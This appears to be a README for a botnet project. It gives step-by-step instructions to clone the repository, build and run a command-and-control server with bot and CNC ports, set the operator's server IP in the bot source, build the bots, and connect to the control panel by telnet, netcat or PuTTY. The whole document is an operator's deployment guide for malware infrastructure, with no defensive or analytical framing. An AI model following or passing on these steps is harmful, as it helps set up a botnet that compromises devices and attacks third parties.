# Steps:
- git clone https://github.com/NoSpacesFlies/Botnet/
- cd Botnet
- Edit users in database/logins.txt
- sh buildcnc.sh
- screen ./server <botport> <threads> <cncport>
# Bot steps
- Edit main.c in /bot to your bot port and vps ip
- sh legacybotbuilder.sh

# Connecting
- Putty raw using vps ip + cnc port
- OR Unix telnet or netcat command using vps ip + cnc port
- OR Termux telnet or netcat command using vps ip + cnc port
